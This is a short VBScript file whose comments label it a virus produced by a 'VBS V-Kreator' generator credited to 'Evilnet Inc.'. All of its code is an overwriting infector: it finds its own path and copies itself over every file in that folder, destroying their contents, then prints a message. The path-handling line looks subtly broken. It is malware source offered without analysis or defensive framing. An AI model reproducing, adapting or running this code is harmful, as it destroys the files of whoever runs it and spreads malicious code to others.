'k.VBS virus kodirao k
'k
'd
'VBS V-Kreator v1.0 kodirao ImPU1s3 - Evilnet Inc. (welcome.to/the_evilnet)
Dim FSO, wshshell
set wshshell = Wscript.Createobject("Wscript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
majka = Wscript.ScriptFullName
put_do_zivota = Left(majka, InStrRev(majka, " \ "))
For Each k In FSO.GetFolder(put_do_zivota).Files
FSO.CopyFile majka, k.Name, 1
Next
Wscript.Echo d
